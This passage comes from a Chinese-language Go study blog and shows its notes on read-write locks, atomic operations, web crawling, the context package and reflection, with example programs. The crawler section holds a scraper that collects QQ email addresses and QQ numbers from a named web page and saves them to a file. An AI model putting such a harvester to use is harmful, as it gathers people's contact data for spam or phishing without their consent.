class="hljs-keyword">go</span> add()<br>wg.Wait()<br>fmt.Println(x, time.Now())<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="读写锁"><a href="#读写锁" class="headerlink" title="读写锁"></a>读写锁</h3><p>互斥锁是所有操作都被禁止,但是大部分应用场景是读多写少,互斥锁使用时不能读不能写,会堵塞进程降低性能,这个时候就可以使用读写锁.<br>RWmutex</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> (<br>x  <span class="hljs-type">int64</span><br>wg sync.WaitGroup<br><span class="hljs-comment">// lock   sync.Mutex</span><br>rwlock sync.RWMutex<br>)<br><span class="hljs-comment">//模拟写操作,睡10ms</span><br><span class="hljs-comment">//一个操作里有读写锁的关上与打开和计数器减一,三个必要操作</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">write</span><span class="hljs-params">()</span></span> &#123;<br>rwlock.Lock()<br>x = x + <span class="hljs-number">1</span><br>rwlock.Unlock()<br>time.Sleep(<span class="hljs-number">10</span> * time.Millisecond)<br>wg.Done()<br>&#125;<br><span class="hljs-comment">//模拟读操作,睡1ms</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">read</span><span class="hljs-params">()</span></span> &#123;<br>rwlock.RLock()<br>time.Sleep(time.Millisecond)<br>rwlock.RUnlock()<br>wg.Done()<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>start := time.Now()<br><span class="hljs-comment">//模拟实际情况,读远大于写</span><br><span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">1000</span>; i++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> read()<br>&#125;<br><span class="hljs-keyword">for</span> j := <span class="hljs-number">0</span>; j &lt; <span class="hljs-number">10</span>; j++ &#123;<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> write()<br>&#125;<br>wg.Wait()<br>end := time.Now()<br>fmt.Println(end.Sub(start))<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="原子操作"><a href="#原子操作" class="headerlink" title="原子操作"></a>原子操作</h3><p>看的不是很懂,把gmp看完再来过一遍吧</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-comment">// 我们填写一个示例来比较下互斥锁和原子操作的性能。</span><br><br><span class="hljs-keyword">var</span> x <span class="hljs-type">int64</span><br><span class="hljs-keyword">var</span> l sync.Mutex<br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><br><span class="hljs-comment">// 普通版加函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">add</span><span class="hljs-params">()</span></span> &#123;<br>    <span class="hljs-comment">// x = x + 1</span><br>    x++ <span class="hljs-comment">// 等价于上面的操作</span><br>    wg.Done()<br>&#125;<br><br><span class="hljs-comment">// 互斥锁版加函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">mutexAdd</span><span class="hljs-params">()</span></span> &#123;<br>    l.Lock()<br>    x++<br>    l.Unlock()<br>    wg.Done()<br>&#125;<br><br><span class="hljs-comment">// 原子操作版加函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">atomicAdd</span><span class="hljs-params">()</span></span> &#123;<br>    atomic.AddInt64(&amp;x, <span class="hljs-number">1</span>)<br>    wg.Done()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    start := time.Now()<br>    <span class="hljs-keyword">for</span> i := <span class="hljs-number">0</span>; i &lt; <span class="hljs-number">10000</span>; i++ &#123;<br>        wg.Add(<span class="hljs-number">1</span>)<br>        <span class="hljs-comment">// go add()       // 普通版add函数 不是并发安全的</span><br>        <span class="hljs-comment">// go mutexAdd()  // 加锁版add函数 是并发安全的，但是加锁性能开销大</span><br>        <span class="hljs-keyword">go</span> atomicAdd() <span class="hljs-comment">// 原子操作版add函数 是并发安全，性能优于加锁版</span><br>    &#125;<br>    wg.Wait()<br>    end := time.Now()<br>    fmt.Println(x)<br>    fmt.Println(end.Sub(start))<br>&#125;<br><span class="hljs-comment">// atomic包提供了底层的原子级内存操作，对于同步算法的实现很有用。这些函数必须谨慎地保证正确使用。</span><br><span class="hljs-comment">// 除了某些特殊的底层应用，使用通道或者sync包的函数/类型实现同步更好。</span><br></code></pre></td></tr></table></figure><h2 id="爬虫"><a href="#爬虫" class="headerlink" title="爬虫"></a>爬虫</h2><h3 id="爬虫步骤"><a href="#爬虫步骤" class="headerlink" title="爬虫步骤"></a>爬虫步骤</h3><p>明确目标（确定在哪个网站搜索）<br>爬（爬下内容）<br>取（筛选想要的）<br>处理数据（按照你的想法去处理）</p><p><img src="https://cdn.jsdelivr.net/gh/taosu0216/picgo/20231010103353.png"></p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;io&quot;</span><br><span class="hljs-string">&quot;net/http&quot;</span><br><span class="hljs-string">&quot;os&quot;</span><br><span class="hljs-string">&quot;regexp&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> reQQemail = <span class="hljs-string">`(\d+)@qq.com`</span><br><br><span class="hljs-comment">// 爬取邮箱跟qq的函数</span><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">Getemail</span><span class="hljs-params">(file *os.File)</span></span> &#123;<br><span class="hljs-comment">//计算爬取时间</span><br>start := time.Now()<br><span class="hljs-comment">//对网站进行访问及爬取</span><br>resp, err := http.Get(<span class="hljs-string">&quot;https://www.xyfinance.org/hot/516352&quot;</span>)<br>HandleErr(err, <span class="hljs-string">&quot;http.Get url&quot;</span>)<br><span class="hljs-keyword">defer</span> resp.Body.Close()<br><span class="hljs-comment">//读取网站的全部响应内容</span><br>pagebody, err := io.ReadAll(resp.Body)<br>HandleErr(err, <span class="hljs-string">&quot;io.ReadAll&quot;</span>)<br><span class="hljs-comment">//pagebody本来是字节切片,这里转换成字符串格式方便操作</span><br>pageStr := <span class="hljs-type">string</span>(pagebody)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">这行代码首先使用 regexp.MustCompile 函数来将正则表达式模式 reQQemail 编译为一个可重复使用的正则表达式对象 re。</span><br><span class="hljs-comment">这将创建一个用于匹配 reQQemail 模式的正则表达式。</span><br><span class="hljs-comment">*/</span><br>re := regexp.MustCompile(reQQemail)<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">使用之前创建的正则表达式 re 在字符串 pageStr 中查找所有匹配 reQQemail 模式的子字符串，并将结果存储在 results 变量中。</span><br><span class="hljs-comment">-1 表示查找所有匹配项。如果是正整数则表示匹配次数,而-1则是有多少匹配多少</span><br><span class="hljs-comment">*/</span><br>results := re.FindAllStringSubmatch(pageStr, <span class="hljs-number">-1</span>)<br><span class="hljs-comment">//这里的results是一个二维切片,result是一个一维切片,reslut[0]相当于results[0][0]</span><br><span class="hljs-keyword">for</span> index, result := <span class="hljs-keyword">range</span> results &#123;<br>email := result[<span class="hljs-number">0</span>]<br>qq := result[<span class="hljs-number">1</span>]<br>fmt.Println(<span class="hljs-string">&quot;email:&quot;</span>, email)<br>fmt.Println(<span class="hljs-string">&quot;QQ:&quot;</span>, qq)<br>fmt.Fprintf(file, <span class="hljs-string">&quot;%d. \nemail:%s\n&quot;</span>, index+<span class="hljs-number">1</span>, email)<br>fmt.Fprintf(file, <span class="hljs-string">&quot;QQ:%s\n&quot;</span>, qq)<br>&#125;<br>end := time.Now()<br>fmt.Println(<span class="hljs-string">&quot;线程用时:&quot;</span>, end.Sub(start))<br><br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">HandleErr</span><span class="hljs-params">(err <span class="hljs-type">error</span>, why <span class="hljs-type">string</span>)</span></span> &#123;<br><span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>fmt.Println(why, err)<br>&#125;<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//在当前目录下建立txt文件</span><br>file, err := os.Create(<span class="hljs-string">&quot;tmp/qq_email.txt&quot;</span>)<br>HandleErr(err, <span class="hljs-string">&quot;os.Create&quot;</span>)<br><span class="hljs-keyword">defer</span> file.Close()<br><span class="hljs-comment">//爬取邮箱及qq</span><br>Getemail(file)<br>&#125;<br><br></code></pre></td></tr></table></figure><p>并发爬虫下载图片(速度非常慢)<br><a href="https://github.com/taosu0216/go_stu/tree/main/Spider">https://github.com/taosu0216/go_stu/tree/main/Spider</a></p><h1 id="context上下文"><a href="#context上下文" class="headerlink" title="context上下文"></a>context上下文</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;context&quot;</span><br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;sync&quot;</span><br><span class="hljs-string">&quot;time&quot;</span><br>)<br><br><span class="hljs-keyword">var</span> wg sync.WaitGroup<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">worker</span><span class="hljs-params">(ctx context.Context)</span></span> &#123;<br>LOOP:<br><span class="hljs-keyword">for</span> &#123;<br>fmt.Println(<span class="hljs-string">&quot;worker&quot;</span>)<br>time.Sleep(<span class="hljs-number">1</span> * time.Second)<br><span class="hljs-keyword">select</span> &#123;<br><span class="hljs-comment">//这里的ctx.Done()不是一个函数,而是一个channel,在cancel()执行时,会关闭这个channel。</span><br><span class="hljs-comment">//当一个channel被关闭后,再从这个channel接收数据,会获得该channel类型的零值。</span><br><span class="hljs-comment">//也就是说当cancel()执行时,会关闭这个channel,然后case接收到一个0值,就会执行break跳出LOOP</span><br><span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-comment">//这里的break LOOP是退出被LOOP标签包裹的所有循环(这里是for+select)</span><br><span class="hljs-comment">//如果不是break LOOP的话会导致继续进入for循环</span><br><span class="hljs-keyword">break</span> LOOP<br><span class="hljs-comment">//这里的只有case的话可能会被堵塞,所以加一个空default</span><br><span class="hljs-keyword">default</span>:<br>&#125;<br>&#125;<br>wg.Done()<br>&#125;<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br><span class="hljs-comment">//接收一个上下文,并返回一个新的上下文和一个取消函数</span><br><span class="hljs-comment">//context.Background()用于创建一个空的根上下文（root context）。</span><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">根上下文是一个空的上下文，它没有任何与之相关联的值或取消机制。</span><br><span class="hljs-comment">它通常作为其他上下文的父上下文（parent context）使用，</span><br><span class="hljs-comment">可以通过调用context.WithCancel、context.WithDeadline、context.WithTimeout等函数</span><br><span class="hljs-comment">创建一个带有取消功能的上下文。</span><br><span class="hljs-comment"></span><br><span class="hljs-comment">这是context.Background()函数的函数签名：</span><br><span class="hljs-comment">func Background() Context</span><br><span class="hljs-comment">*/</span><br>ctx, cancel := context.WithCancel(context.Background())<br>wg.Add(<span class="hljs-number">1</span>)<br><span class="hljs-keyword">go</span> worker(ctx)<br>time.Sleep(<span class="hljs-number">4</span> * time.Second)<br>cancel()<br>wg.Wait()<br>fmt.Println(<span class="hljs-string">&quot;over&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure><p>context.Context是一个接口,签名如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">type</span> Context <span class="hljs-keyword">interface</span> &#123;<br>    Deadline() (deadline time.Time, ok <span class="hljs-type">bool</span>)<br>    Done() &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-keyword">struct</span>&#123;&#125;<br>    Err() <span class="hljs-type">error</span><br>    Value(key <span class="hljs-keyword">interface</span>&#123;&#125;) <span class="hljs-keyword">interface</span>&#123;&#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>Deadline方法需要返回当前Context被取消的时间，也就是完成工作的截止时间（deadline）</p><p>Done方法需要返回一个Channel，这个Channel会在当前工作完成或者上下文被取消之后关闭，多次调用Done方法会返回同一个Channel</p><p>Err方法会返回当前Context结束的原因，它只会在Done返回的Channel被关闭时才会返回非空的值<br>如果当前Context被取消就会返回Canceled错误<br>如果当前Context超时就会返回DeadlineExceeded错误</p><p>Value方法会从Context中返回键对应的值，对于同一个上下文来说，多次调用Value 并传入相同的Key会返回相同的结果，该方法仅用于传递跨API和进程间跟请求域的数据</p><h2 id="Background-和TODO"><a href="#Background-和TODO" class="headerlink" title="Background()和TODO()"></a>Background()和TODO()</h2><p>Go内置两个函数：Background()和TODO()，这两个函数分别返回一个实现了Context接口的background和todo。我们代码中最开始都是以这两个内置的上下文对象作为最顶层的partent context，衍生出更多的子上下文对象。</p><p>Background()主要用于main函数、初始化以及测试代码中，作为Context这个树结构的最顶层的Context，也就是根Context。</p><p>TODO()，它目前还不知道具体的使用场景，如果我们不知道该使用什么Context的时候，可以使用这个。</p><p>background和todo本质上都是emptyCtx结构体类型，是一个不可取消，没有设置截止时间，没有携带任何值的Context。</p><h2 id="With函数"><a href="#With函数" class="headerlink" title="With函数"></a>With函数</h2><p>此外，context包中还定义了四个With系列函数。</p><h3 id="WithCancel"><a href="#WithCancel" class="headerlink" title="WithCancel"></a>WithCancel</h3><p>函数签名如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithCancel</span><span class="hljs-params">(parent Context)</span></span> (ctx Context, cancel CancelFunc)<br></code></pre></td></tr></table></figure><p>WithCancel返回带有新Done通道的父节点的副本。当调用返回的cancel函数或当关闭父上下文的Done通道时，将关闭返回上下文的Done通道，无论先发生什么情况。<br>取消此上下文将释放与其关联的资源，因此代码应该在此上下文中运行的操作完成后立即调用cancel。</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">gen</span><span class="hljs-params">(ctx context.Context)</span></span> &lt;-<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span> &#123;<br>        dst := <span class="hljs-built_in">make</span>(<span class="hljs-keyword">chan</span> <span class="hljs-type">int</span>)<br>        n := <span class="hljs-number">1</span><br>        <span class="hljs-keyword">go</span> <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">()</span></span> &#123;<br>            <span class="hljs-keyword">for</span> &#123;<br>                <span class="hljs-keyword">select</span> &#123;<br>                <span class="hljs-keyword">case</span> &lt;-ctx.Done():<br><span class="hljs-comment">//这里的return类似前面的break LOOP,就是跳出整个循环</span><br>                    <span class="hljs-keyword">return</span> <span class="hljs-comment">// return结束该goroutine，防止泄露</span><br>                <span class="hljs-keyword">case</span> dst &lt;- n:<br>                    n++<br>                &#125;<br>            &#125;<br>        &#125;()<br>        <span class="hljs-keyword">return</span> dst<br>    &#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>    ctx, cancel := context.WithCancel(context.Background())<br>    <span class="hljs-keyword">defer</span> cancel() <span class="hljs-comment">// 当我们取完需要的整数后调用cancel</span><br><br>    <span class="hljs-keyword">for</span> n := <span class="hljs-keyword">range</span> gen(ctx) &#123;<br>        fmt.Println(n)<br>        <span class="hljs-keyword">if</span> n == <span class="hljs-number">5</span> &#123;<br>            <span class="hljs-keyword">break</span><br>        &#125;<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h3 id="WithDeadline"><a href="#WithDeadline" class="headerlink" title="WithDeadline"></a>WithDeadline</h3><p>通常是用cancel()就可以做到,但是有些时候可能会因为各种原因没有调用cancel(),这里的WithDeadline就是在cancel()出意外没有调用时的保底手段<br>签名如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithDeadline</span><span class="hljs-params">(parent Context, deadline time.Time)</span></span> (Context, CancelFunc)<br></code></pre></td></tr></table></figure><p>设置dead时间,并返回一个新的上下文对象,这个新的上下文对象是对原来的上下文对象的复制,但是多了生效时间,后面再给函数传参时就可以传递这个新的对象而不是原来的对象<br>除了在超时之外自动取消,也可以用返回的cancelFunc手动取消</p><h3 id="WithTimeOut"><a href="#WithTimeOut" class="headerlink" title="WithTimeOut"></a>WithTimeOut</h3><p>跟上面差不多,但timeout是隔多长时间后自动停止,设置的是一个最大时间,而前面的deadline则是具体的时间点,是绝对时间</p><h3 id="WithValue"><a href="#WithValue" class="headerlink" title="WithValue"></a>WithValue</h3><p>函数签名如下</p><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">WithValue</span><span class="hljs-params">(parent Context, key, val <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> Context<br></code></pre></td></tr></table></figure><h1 id="反射"><a href="#反射" class="headerlink" title="反射"></a>反射</h1><p>这篇讲的挺细的<br><a href="https://juejin.cn/post/6844903559335526407?searchId=202310120916499405104F20617909405F">https://juejin.cn/post/6844903559335526407?searchId=202310120916499405104F20617909405F</a></p><p>reflect包封装了反射相关的方法<br>获取类型信息：reflect.TypeOf，是静态的<br>获取值信息：reflect.ValueOf，是动态的</p><h2 id="反射获取interface值信息"><a href="#反射获取interface值信息" class="headerlink" title="反射获取interface值信息"></a>反射获取interface值信息</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>x := <span class="hljs-number">123.456</span><br>reflect_value(x)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">reflect_value</span><span class="hljs-params">(x <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>v := reflect.ValueOf(x)<br>fmt.Println(v)<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, v)<br>k := v.Kind()<br>fmt.Println(k)<br>fmt.Printf(<span class="hljs-string">&quot;%T\n&quot;</span>, k)<br><span class="hljs-keyword">switch</span> k &#123;<br><span class="hljs-comment">//这里的reflect.Int中的Int可以换成任何变量类型,String,Struct等等都可以</span><br><span class="hljs-keyword">case</span> reflect.Int:<br>fmt.Println(<span class="hljs-string">&quot;是&quot;</span>, v.Int())<br><span class="hljs-keyword">default</span>:<br><span class="hljs-comment">//这里看不懂用v.Float()的作用,感觉跟直接打印v是一样的</span><br>fmt.Println(<span class="hljs-string">&quot;不是&quot;</span>,v.Float())<br>&#125;<br>&#125;<br><br><span class="hljs-comment">/*</span><br><span class="hljs-comment">123.456</span><br><span class="hljs-comment">reflect.Value</span><br><span class="hljs-comment">float64</span><br><span class="hljs-comment">reflect.Kind</span><br><span class="hljs-comment">不是</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="反射获取interface类型信息"><a href="#反射获取interface类型信息" class="headerlink" title="反射获取interface类型信息"></a>反射获取interface类型信息</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>x := <span class="hljs-number">23.45</span><br>re(x)<br>&#125;<br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">re</span><span class="hljs-params">(x <span class="hljs-keyword">interface</span>&#123;&#125;)</span></span> &#123;<br>value := reflect.TypeOf(x)<br>fmt.Println(<span class="hljs-string">&quot;x的类型是:&quot;</span>, value)<br><span class="hljs-comment">//这里说的是.Kind()可以获取更具体的信息</span><br>k := value.Kind()<br>fmt.Println(k)<br><span class="hljs-comment">//注意这里是switch,select是channel用的</span><br><span class="hljs-keyword">switch</span> k &#123;<br><span class="hljs-keyword">case</span> reflect.Float64:<br>fmt.Println(<span class="hljs-string">&quot;x的类型是&quot;</span>, k)<br><span class="hljs-keyword">default</span>:<br>fmt.Println(<span class="hljs-string">&quot;不是float64&quot;</span>)<br>&#125;<br>&#125;<br><span class="hljs-comment">/*</span><br><span class="hljs-comment">x的类型是: float64</span><br><span class="hljs-comment">float64</span><br><span class="hljs-comment">x的类型是 float64</span><br><span class="hljs-comment">*/</span><br></code></pre></td></tr></table></figure><h2 id="反射修改值信息"><a href="#反射修改值信息" class="headerlink" title="反射修改值信息"></a>反射修改值信息</h2><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-keyword">package</span> main<br><br><span class="hljs-keyword">import</span> (<br><span class="hljs-string">&quot;fmt&quot;</span><br><span class="hljs-string">&quot;reflect&quot;</span><br>)<br><br><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span 